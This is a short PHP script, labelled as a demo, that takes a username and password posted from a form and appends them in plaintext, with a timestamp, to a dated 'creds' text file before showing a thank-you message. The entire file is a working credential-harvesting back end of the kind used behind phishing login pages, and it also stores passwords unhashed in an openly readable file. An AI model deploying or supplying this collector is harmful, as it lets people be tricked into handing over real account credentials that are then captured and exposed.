<?php
// Author: Chethana UG
// Date: 2025-09-12
// Demo only: saves dummy credentials locally with timestamp

// Get data safely
$user = isset($_POST['user']) ? $_POST['user'] : '';
$pass = isset($_POST['pass']) ? $_POST['pass'] : '';
$time = date('Y-m-d H:i:s');

// Build filename with today's date
$filename = "creds_" . date('Ymd') . ".txt";

// Append entry
$file = fopen($filename, "a");
fwrite($file, "[$time] User: $user | Pass: $pass\n");
fclose($file);

// Simple confirmation
echo "✅ Thanks! (demo only)";
?>
